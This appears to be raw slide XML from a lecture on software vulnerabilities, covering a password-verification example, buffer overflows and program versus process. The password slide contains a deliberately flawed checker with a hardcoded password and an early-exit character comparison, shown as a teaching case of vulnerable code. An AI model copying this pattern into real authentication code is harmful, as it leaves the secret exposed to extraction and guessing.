            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1790491" y="6263342"/>
            <a:ext cx="5616442" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Example from Michael A. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Erlinger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> at Harvey </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Mudd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> College</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259523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Vulnerability</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="139565" y="1954723"/>
            <a:ext cx="3693815" cy="4226269"/>
            <a:chOff x="322868" y="2706338"/>
            <a:chExt cx="3693815" cy="4226269"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="322868" y="3239288"/>
              <a:ext cx="3693815" cy="369331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urier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>Boolean check(String x){</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = “</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>ohmekciziks</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>”;</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd.len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>();</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	if(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>x.len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>() != </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>)</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		return false; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = 0; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	while(x[</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>] == </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>[</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>]){</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		if(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> == (</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> -1))</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>			return true;</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>++; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	}</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	return false; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>}</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="TextBox 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="386248" y="2706338"/>
              <a:ext cx="3296057" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>A password verification program.</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5298260" y="1569651"/>
            <a:ext cx="3425492" cy="385072"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Better Way?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1790491" y="6400623"/>
            <a:ext cx="5616442" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Example from Michael A. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Erlinger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> at Harvey </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Mudd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> College</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="385542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Vulnerability</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="752233" y="1417638"/>
            <a:ext cx="7653003" cy="5049404"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1951619" y="6400623"/>
            <a:ext cx="5397681" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Figure from Michael A. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Erlinger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> at Harvey </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>Mudd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t> College</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3124864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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>A Buffer Overflow is an anomaly where data is stored beyond the boundary of a fixed-length buffer. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="stack-buffer-overflow.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354" y="2717462"/>
            <a:ext cx="2589595" cy="3107514"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3004658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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>Stack Overflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Heap Overflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detailed Discussion in Host Security. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3058158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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Program V.S. Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Static instructions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Static data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An instance of a program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Loaded into the memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Executing and dynamic</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="395448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V.S. Process</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1183649" y="1590244"/>
            <a:ext cx="1750815" cy="76459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Source Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(.c, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cpp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, .java….)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1183649" y="3160478"/>
            <a:ext cx="1750815" cy="76459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Executable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(EXE, ELF….)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1183649" y="4718383"/>
            <a:ext cx="1750815" cy="76459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Process</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="5" idx="2"/>
            <a:endCxn id="6" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2059057" y="2354837"/>
            <a:ext cx="0" cy="8056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2059057" y="3925071"/>
            <a:ext cx="0" cy="8056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Right Brace 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3353673" y="1849348"/>
            <a:ext cx="271253" cy="170140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Right Brace 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3370447" y="4730713"/>
            <a:ext cx="254479" cy="75226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p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3674241" y="2453738"/>
            <a:ext cx="990212" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Program</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3674241" y="4887001"/>
            <a:ext cx="902811" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Process</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="cpu.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6371" y="3295560"/>
            <a:ext cx="4275659" cy="3036776"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571606" y="2544493"/>
            <a:ext cx="1441959" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Compile, Link</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1183649" y="4085419"/>
            <a:ext cx="635285" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Load</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Freeform 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2934464" y="3064776"/>
            <a:ext cx="3057761" cy="1718872"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 3057761"/>
              <a:gd name="connsiteY0" fmla="*/ 1718872 h 1718872"/>
              <a:gd name="connsiteX1" fmla="*/ 1837123 w 3057761"/>
              <a:gd name="connsiteY1" fmla="*/ 29800 h 1718872"/>
